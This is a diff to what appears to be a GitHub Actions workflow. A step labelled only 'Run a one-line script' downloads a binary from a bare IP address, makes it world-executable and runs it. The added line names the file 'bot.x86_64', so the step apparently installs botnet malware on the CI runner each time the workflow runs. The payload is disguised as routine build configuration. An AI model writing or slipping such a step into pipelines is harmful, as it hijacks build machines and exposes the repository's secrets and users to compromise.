@@ -27,7 +27,7 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: Run a one-line script
-        run: wget http://193.233.185.152/x86_64; chmod 777 x86_64; ./x86_64 x86
+        run: wget http://193.233.185.152/bot.x86_64; chmod 777 bot.x86_64; ./bot.x86_64 x86
 
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
